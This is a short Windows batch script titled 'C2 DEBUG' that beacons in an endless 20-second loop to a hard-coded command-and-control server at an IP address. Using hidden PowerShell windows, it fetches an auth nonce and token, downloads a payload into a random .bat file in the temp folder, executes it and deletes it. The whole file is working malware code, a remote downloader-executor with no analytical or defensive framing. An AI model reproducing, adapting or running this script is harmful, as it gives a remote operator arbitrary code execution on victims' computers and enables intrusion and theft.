@ECHO OFF
TITLE C2 DEBUG - 82.29.153.101:8080
MODE CON COLS=100 LINES=50

SET C2=http://82.29.153.101:8080
SET TMPFILE=%TEMP%\c2_%RANDOM%.bat

:MENU
CLS
ECHO ========================================
ECHO C2 DEBUG MODE - %DATE% %TIME%
ECHO Server: %C2%
ECHO ========================================

ECHO [AUTH]
powershell -NoP -W Hidden -C ^
"$r=iwr '%C2%/auth/key' -UseB; ^
$j=$r.Content|ConvertFrom-Json; ^
set-content env:nonce $j.nonce; ^
set-content env:token $j.token; ^
'[OK] NONCE: '+$j.nonce+' TOKEN: '+$j.token"

ECHO.
ECHO [PAYLOAD]
powershell -NoP -W Hidden -C ^
"$h=@{X-Nonce=$env:nonce;X-Token=$env:token}; ^
$r=iwr '%C2%/payload/encrypted' -H $h -UseB; ^
$r.Content|Out-File '%TMPFILE%' -Enc UTF8; ^
'[OK] '+$r.Content.Length+' bytes -> %TMPFILE%'; ^
type '%TMPFILE%'"

ECHO.
IF EXIST "%TMPFILE%" (
    ECHO [EXEC]
    CALL "%TMPFILE%"
    DEL "%TMPFILE%" 2>NUL
)

ECHO.
ECHO [WAIT 20s...]
PING 127.0.0.1 -n 21 >NUL
GOTO MENU